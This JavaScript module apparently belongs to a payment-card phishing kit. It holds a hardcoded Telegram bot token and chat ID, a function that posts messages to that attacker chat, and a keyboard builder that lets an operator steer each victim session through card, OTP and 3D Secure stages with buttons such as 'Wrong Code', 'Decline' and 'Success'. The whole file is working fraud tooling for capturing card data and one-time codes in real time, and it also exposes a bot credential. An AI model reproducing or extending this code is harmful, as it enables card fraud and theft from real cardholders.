// Telegram config
export const BOT_TOKEN = '5782049749:AAGP1ULW3f2MbYNUfI6Q3sof9hY1Hrcp4ko';
export const CHAT_ID = '-5120286446';

/**
 * @param {string} message
 * @param {object} [replyMarkup]
 */
export async function sendTelegram(message, replyMarkup) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };
  if (replyMarkup) payload.reply_markup = replyMarkup;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!r.ok) {
      const t = await r.text().catch(() => '');
      console.error('[telegram] sendMessage failed', r.status, t);
    }
  } catch (e) {
    console.error('[telegram] fetch error', e);
  }
}

/**
 * Build inline keyboard for admin control.
 * When baseUrl is provided and public, buttons are URL buttons (click → opens set-mode).
 * Otherwise callback_data (needs /api/tg-hook webhook registered).
 * @param {string} sessionId
 * @param {string} baseUrl
 * @param {'card'|'otp'|'3ds'} stage
 */
export function buildKeyboard(sessionId, baseUrl, stage = 'card') {
  // Telegram rejects http://localhost / private IPs as URL buttons.
  // Detect and fall back to callback_data (requires /api/tg-hook webhook for live control,
  // but admin can always use /admin panel regardless).
  const isPublic = !!baseUrl && /^https?:\/\//.test(baseUrl) && !/localhost|127\.0\.0\.1|192\.168\.|10\.|::1/.test(baseUrl);
  const url = (a) => `${baseUrl}/api/set-mode?s=${encodeURIComponent(sessionId)}&a=${a}`;
  const btn = (text, a) =>
    isPublic
      ? { text, url: url(a) }
      : { text, callback_data: `${a}:${sessionId}` };

  if (stage === 'card') {
    return {
      inline_keyboard: [
        [btn('🔑 OTP', 'otp'), btn('🔗 3D Secure', '3ds')],
        [btn('✅ Success', 'success'), btn('❌ Decline', 'decline')]
      ]
    };
  }
  if (stage === 'otp') {
    return {
      inline_keyboard: [
        [btn('❌ Wrong Code', 'decline'), btn('🔗 → 3D Secure', '3ds')],
        [btn('✅ Success', 'success')]
      ]
    };
  }
  // '3ds'
  return {
    inline_keyboard: [
      [btn('❌ Wrong Link', 'decline'), btn('🔑 → OTP', 'otp')],
      [btn('✅ Success', 'success')]
    ]
  };
}
